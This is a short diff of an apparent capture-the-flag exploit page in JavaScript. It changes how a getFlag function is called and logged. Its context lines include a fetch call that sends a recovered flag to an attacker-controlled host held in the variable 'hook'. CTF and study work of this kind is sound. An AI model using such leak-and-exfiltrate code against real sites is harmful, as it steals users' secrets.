@@ -24,6 +24,7 @@ async function getFlag(chars) {
  if(b) break;}
  fetch(`http://${hook}/flag=${flag}`, {method:’get’});
 };
-getFlag(abc);
+var result = getFlag(abc);
+console.log(result);
 </script>
 <html>
